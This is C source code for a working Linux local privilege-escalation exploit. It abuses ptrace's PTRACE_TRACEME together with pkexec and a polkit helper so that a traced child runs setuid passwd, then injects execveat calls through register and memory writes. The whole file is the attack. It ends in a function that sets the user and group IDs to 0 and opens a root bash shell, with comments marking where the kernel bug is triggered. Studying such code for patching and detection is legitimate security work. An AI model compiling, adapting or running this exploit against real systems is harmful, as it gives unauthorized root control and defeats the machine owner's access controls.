#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>
#include <signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <linux/elf.h>

#define SAFE(expr) ({                   \
  typeof(expr) __res = (expr);          \
  if (__res == -1) err(1, "%s", #expr); \
  __res;                                \
})
#define max(a,b) ((a)>(b) ? (a) : (b))

static int middle_success = 1;
static int block_pipe[2];
static int self_fd = -1;
static int dummy_status;
static const char *helper_path;

const char *helpers[] = {
  "/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper",
};

/* temporary printf; returned pointer is valid until next tprintf */
static char *tprintf(char *fmt, ...) {
  static char buf[10000];
  va_list ap;
  va_start(ap, fmt);
  vsprintf(buf, fmt, ap);
  va_end(ap);
  return buf;
}

static int middle_main(void *dummy) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  pid_t middle = getpid();

  self_fd = SAFE(open("/proc/self/exe", O_RDONLY));

  pid_t child = SAFE(fork());
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);

    SAFE(dup2(self_fd, 42));

    /* spin until our parent becomes privileged (have to be fast here) */
    int proc_fd = SAFE(open(tprintf("/proc/%d/status", middle), O_RDONLY));
    char *needle = tprintf("\nUid:\t%d\t0\t", getuid());
    while (1) {
      char buf[1000];
      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
      buf[buflen] = '\0';
      if (strstr(buf, needle)) break;
    }

    /*
     * this is where the bug is triggered.
     * while our parent is in the middle of pkexec, we force it to become our
     * tracer, with pkexec's creds as ptracer_cred.
     */
    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));

    /*
     * now we execute passwd. because the ptrace relationship is considered to
     * be privileged, this is a proper suid execution despite the attached
     * tracer, not a degraded one.
     * at the end of execve(), this process receives a SIGTRAP from ptrace.
     */
    puts("executing passwd");
    execl("/usr/bin/passwd", "passwd", NULL);
    err(1, "execl passwd");
  }

  SAFE(dup2(self_fd, 0));
  SAFE(dup2(block_pipe[1], 1));

  struct passwd *pw = getpwuid(getuid());
  if (pw == NULL) err(1, "getpwuid");

  middle_success = 1;
  execl("/usr/bin/pkexec", "pkexec", "--user", pw->pw_name,
        helper_path,
        "--help", NULL);
  middle_success = 0;
  err(1, "execl pkexec");
}

static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
  struct user_regs_struct regs;
  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };
  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));
  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));

  /* set up indirect arguments */
  unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;
  struct injected_page {
    unsigned long argv[2];
    unsigned long envv[1];
    char arg0[8];
    char path[1];
  } ipage = {
    .argv = { scratch_area + offsetof(struct injected_page, arg0) }
  };
  strcpy(ipage.arg0, arg0);
  for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {
    unsigned long pdata = ((unsigned long *)&ipage)[i];
    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
                (void*)pdata));
  }

  /* execveat(exec_fd, path, argv, envv, flags) */
  regs.orig_rax = __NR_execveat;
  regs.rdi = exec_fd;
  regs.rsi = scratch_area + offsetof(struct injected_page, path);
  regs.rdx = scratch_area + offsetof(struct injected_page, argv);
  regs.r10 = scratch_area + offsetof(struct injected_page, envv);
  regs.r8 = AT_EMPTY_PATH;

  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));
}

static int middle_stage2(void) {
  /* our child is hanging in signal delivery from execve()'s SIGTRAP */
  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));
  force_exec_and_wait(child, 42, "stage3");
  return 0;
}

static int spawn_shell(void) {
  SAFE(setresgid(0, 0, 0));
  SAFE(setresuid(0, 0, 0));
  execlp("bash", "bash", NULL);
  err(1, "execlp");
}

int main(int argc, char **argv) {
  if (strcmp(argv[0], "stage2") == 0)
    return middle_stage2();
  if (strcmp(argv[0], "stage3") == 0)
    return spawn_shell();

  for (int i=0; i<sizeof(helpers)/sizeof(helpers[0]); i++) {
    struct stat st;
    if (stat(helpers[i], &st) == 0) {
      helper_path = helpers[i];
      break;
    }
  }
  if (helper_path == NULL)
    errx(1, "no known helper found, add a helper with <allow_active>yes</allow_active> from /usr/share/polkit-1/actions to `helpers`");

  /*
   * set up a pipe such that the next write to it will block: packet mode,
   * limited to one packet
   */
  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
  char dummy = 0;
  SAFE(write(block_pipe[1], &dummy, 1));

  /* spawn pkexec in a child, and continue here once our child is in execve() */
  static char middle_stack[1024*1024];
  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
  if (!middle_success) return 1;

  /*
   * wait for our child to go through both execve() calls (first pkexec, then
   * the executable permitted by polkit policy).
   */
  while (1) {
    int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
    char buf[16];
    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
    buf[buflen] = '\0';
    *strchrnul(buf, '\n') = '\0';
    if (strncmp(buf, basename(helper_path), 15) == 0)
      break;
    usleep(100000);
  }

  /*
   * our child should have gone through both the privileged execve() and the
   * following execve() here
   */
  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
  SAFE(waitpid(midpid, &dummy_status, 0));
  fputs("attached to midpid\n", stderr);

  force_exec_and_wait(midpid, 0, "stage2");
  return 0;
}
